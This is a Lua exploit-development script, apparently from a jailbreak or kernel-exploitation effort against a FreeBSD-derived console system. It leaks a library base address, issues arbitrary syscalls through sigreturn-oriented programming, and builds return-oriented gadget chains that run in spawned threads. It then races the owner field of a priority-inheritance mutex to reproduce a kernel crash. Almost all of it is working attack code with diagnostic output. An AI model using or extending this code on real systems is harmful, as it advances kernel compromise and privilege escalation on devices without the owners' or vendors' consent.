-- CRASH_CLASS: MODERATE
-- PROBE 146g3: Isolated race: child blocks on PI lock while main modifies m_owner
-- 146g crashed at section C (thread block + race). Reproduce with output.

print("=== PROBE 146g3: RACE ISOLATE ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local sc_thr = make_syscall(430)
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), uint64(info)) end)
local elo = to_num(memory.read_dword(info + 0x108))
local ehi = to_num(memory.read_dword(info + 0x10C))

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)

local g_ret     = uint64(string.format("0x%X%08X", ehi, elo + 0x42))
local g_pop_rdi = uint64(string.format("0x%X%08X", ehi, elo + 0xC9DFE))
local g_pop_rsi = uint64(string.format("0x%X%08X", ehi, elo + 0xD77D))
local g_pop_rax = uint64(string.format("0x%X%08X", ehi, elo + 0x992))
local g_wr      = uint64(string.format("0x%X%08X", ehi, elo + 0xD0B60))

-- Step 1: Main locks PI mutex
local mtx = gpu + 0x1000
local mtx_a = uint64(string.format("0x%X%08X", gh, gl + 0x1000))
wd(mtx, 0)
wd(mtx + 4, 4)
for off = 8, 47, 4 do wd(mtx + off, 0) end

srop(454, uint64(mtx_a), uint64(5), uint64(0), uint64(0), uint64(0))
local main_tid = to_num(memory.read_dword(mtx))
print("main_owns=0x" .. string.format("%08X", main_tid))

-- Step 2: Child blocks on LOCK (will set CONTESTED and sleep in kernel)
local cdone = gpu + 0x2000
wq(cdone, uint64(0))
local cdone_a = uint64(string.format("0x%X%08X", gh, gl + 0x2000))

local cts = gpu + 0x3000
wq(cts, uint64(0))
wq(cts + 8, uint64(30000000))
local cts_a = uint64(string.format("0x%X%08X", gh, gl + 0x3000))

local crop = gpu + 0x10000
local crop_a = uint64(string.format("0x%X%08X", gh, gl + 0x10000))
local ci = 0

-- sleep 30ms
wq(crop+ci, g_pop_rdi); ci=ci+8
wq(crop+ci, cts_a); ci=ci+8
wq(crop+ci, g_pop_rsi); ci=ci+8
wq(crop+ci, uint64(0)); ci=ci+8
wq(crop+ci, g_pop_rax); ci=ci+8
wq(crop+ci, uint64(240)); ci=ci+8
wq(crop+ci, sc_addr); ci=ci+8

-- LOCK (blocks here)
wq(crop+ci, g_pop_rdi); ci=ci+8
wq(crop+ci, mtx_a); ci=ci+8
wq(crop+ci, g_pop_rsi); ci=ci+8
wq(crop+ci, uint64(5)); ci=ci+8
wq(crop+ci, g_pop_rax); ci=ci+8
wq(crop+ci, uint64(454)); ci=ci+8
wq(crop+ci, sc_addr); ci=ci+8

-- Write marker
wq(crop+ci, g_pop_rax); ci=ci+8
wq(crop+ci, uint64("0x00000000AAAA0001")); ci=ci+8
wq(crop+ci, g_pop_rdi); ci=ci+8
wq(crop+ci, cdone_a); ci=ci+8
wq(crop+ci, g_wr); ci=ci+8

-- Exit
wq(crop+ci, g_pop_rdi); ci=ci+8
wq(crop+ci, uint64(0)); ci=ci+8
wq(crop+ci, g_pop_rsi); ci=ci+8
wq(crop+ci, uint64(0)); ci=ci+8
wq(crop+ci, g_pop_rax); ci=ci+8
wq(crop+ci, uint64(431)); ci=ci+8
wq(crop+ci, sc_addr); ci=ci+8

local cctx = gpu + 0x20000
for off = 0, 0x4FF, 4 do wd(cctx + off, 0) end
pcall(function() return sc_gc(uint64(cctx)) end)
wq(cctx + 0xE0, g_ret)
wq(cctx + 0xF8, crop_a)
wq(cctx + MC + 0x18, uint64(0))
wq(cctx + MC + 0x50, uint64(0))
wq(cctx + MC + 0x28, uint64(0))
wq(cctx + MC + 0x30, uint64(0))

local ctbuf = gpu + 0x30000
wq(ctbuf, uint64(0))

print("launching child")
pcall(function() return sc_thr(uint64(cctx), uint64(ctbuf), uint64(0)) end)

-- Step 3: Wait for child to enter kernel LOCK (block on PI)
local tw = memory.alloc(16)
wq(tw, uint64(0))
wq(tw + 8, uint64(150000000))
pcall(function() make_syscall(240)(uint64(tw), uint64(0)) end)

local ob = to_num(memory.read_dword(mtx))
print("after_child=0x" .. string.format("%08X", ob))
print("contested=" .. tostring(ob >= 0x80000000))

-- Step 4: WITHOUT racing, just unlock normally to verify child wakes
print("unlocking normally")
local ul = srop(454, uint64(mtx_a), uint64(6), uint64(0), uint64(0), uint64(0))
print("unlock=" .. (ul and tostring(to_num(ul)) or "nil"))

-- Wait for child
wq(tw, uint64(0))
wq(tw + 8, uint64(300000000))
pcall(function() make_syscall(240)(uint64(tw), uint64(0)) end)

local cd = memory.read_qword(cdone)
local _, cdl = get_hi_lo(cd)
print("child_done=0x" .. string.format("%08X", cdl))
print("mtx_final=0x" .. string.format("%08X", to_num(memory.read_dword(mtx))))
print("baseline_ok")

-- Step 5: Same thing but with m_owner race before unlock
print("")
print("--- RACE TEST ---")
local mtx2 = gpu + 0x4000
local mtx2_a = uint64(string.format("0x%X%08X", gh, gl + 0x4000))
wd(mtx2, 0)
wd(mtx2 + 4, 4)
for off = 8, 47, 4 do wd(mtx2 + off, 0) end

srop(454, uint64(mtx2_a), uint64(5), uint64(0), uint64(0), uint64(0))
local main2 = to_num(memory.read_dword(mtx2))
print("main2=0x" .. string.format("%08X", main2))

-- Child 2 blocks on mtx2
local cdone2 = gpu + 0x5000
wq(cdone2, uint64(0))
local cdone2_a = uint64(string.format("0x%X%08X", gh, gl + 0x5000))

local crop2 = gpu + 0x40000
local crop2_a = uint64(string.format("0x%X%08X", gh, gl + 0x40000))
ci = 0

wq(crop2+ci, g_pop_rdi); ci=ci+8
wq(crop2+ci, cts_a); ci=ci+8
wq(crop2+ci, g_pop_rsi); ci=ci+8
wq(crop2+ci, uint64(0)); ci=ci+8
wq(crop2+ci, g_pop_rax); ci=ci+8
wq(crop2+ci, uint64(240)); ci=ci+8
wq(crop2+ci, sc_addr); ci=ci+8

wq(crop2+ci, g_pop_rdi); ci=ci+8
wq(crop2+ci, mtx2_a); ci=ci+8
wq(crop2+ci, g_pop_rsi); ci=ci+8
wq(crop2+ci, uint64(5)); ci=ci+8
wq(crop2+ci, g_pop_rax); ci=ci+8
wq(crop2+ci, uint64(454)); ci=ci+8
wq(crop2+ci, sc_addr); ci=ci+8

wq(crop2+ci, g_pop_rax); ci=ci+8
wq(crop2+ci, uint64("0x00000000BBBB0001")); ci=ci+8
wq(crop2+ci, g_pop_rdi); ci=ci+8
wq(crop2+ci, cdone2_a); ci=ci+8
wq(crop2+ci, g_wr); ci=ci+8

wq(crop2+ci, g_pop_rdi); ci=ci+8
wq(crop2+ci, uint64(0)); ci=ci+8
wq(crop2+ci, g_pop_rsi); ci=ci+8
wq(crop2+ci, uint64(0)); ci=ci+8
wq(crop2+ci, g_pop_rax); ci=ci+8
wq(crop2+ci, uint64(431)); ci=ci+8
wq(crop2+ci, sc_addr); ci=ci+8

local cctx2 = gpu + 0x50000
for off = 0, 0x4FF, 4 do wd(cctx2 + off, 0) end
pcall(function() return sc_gc(uint64(cctx2)) end)
wq(cctx2 + 0xE0, g_ret)
wq(cctx2 + 0xF8, crop2_a)
wq(cctx2 + MC + 0x18, uint64(0))
wq(cctx2 + MC + 0x50, uint64(0))
wq(cctx2 + MC + 0x28, uint64(0))
wq(cctx2 + MC + 0x30, uint64(0))

local ctbuf2 = gpu + 0x60000
wq(ctbuf2, uint64(0))

print("launching child2")
pcall(function() return sc_thr(uint64(cctx2), uint64(ctbuf2), uint64(0)) end)

-- Wait for child to block
wq(tw, uint64(0))
wq(tw + 8, uint64(150000000))
pcall(function() make_syscall(240)(uint64(tw), uint64(0)) end)

local ob2 = to_num(memory.read_dword(mtx2))
print("after_child2=0x" .. string.format("%08X", ob2))

-- RACE: flip m_owner rapidly, then restore and unlock
print("racing m_owner...")
for r = 1, 5 do
    wd(mtx2, 0) -- clear
    wd(mtx2, ob2) -- restore
end
print("raced 5x")

-- Check state
local ob2b = to_num(memory.read_dword(mtx2))
print("pre_unlock=0x" .. string.format("%08X", ob2b))

-- Unlock
print("unlocking...")
local ok_ul, ul2 = pcall(function()
    return srop(454, uint64(mtx2_a), uint64(6), uint64(0), uint64(0), uint64(0))
end)
print("unlock=" .. (ok_ul and tostring(ul2 and to_num(ul2) or "nil") or "CRASH"))

-- Wait for child2
wq(tw, uint64(0))
wq(tw + 8, uint64(300000000))
pcall(function() make_syscall(240)(uint64(tw), uint64(0)) end)

local cd2 = memory.read_qword(cdone2)
local _, cdl2 = get_hi_lo(cd2)
print("child2_done=0x" .. string.format("%08X", cdl2))
print("mtx2_final=0x" .. string.format("%08X", to_num(memory.read_dword(mtx2))))

print("")
print("pid_post=" .. tostring(to_num(make_syscall(20)())))
print("=== DONE ===")
